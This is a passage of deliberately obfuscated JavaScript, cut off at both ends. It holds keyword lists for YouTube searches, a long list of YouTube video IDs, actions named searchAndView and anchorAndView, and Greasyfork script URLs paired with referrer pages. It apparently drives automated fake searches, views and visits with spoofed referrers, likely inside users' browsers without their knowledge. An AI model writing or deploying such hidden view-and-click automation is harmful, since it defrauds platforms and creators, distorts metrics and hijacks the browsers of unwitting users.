'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x39 + 0x2ed + -0xb * 0x3e)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x80d + -0x1c6d + 0x616 * 0x6)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')[Y(0x11)](',')), searchTerms = searchTerms['flat'](0x3 * -0xae5 + 0xd1b + 0x1397);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    Z(0x15) + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + Z(0xc),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x18) + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + Y(0x5) + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
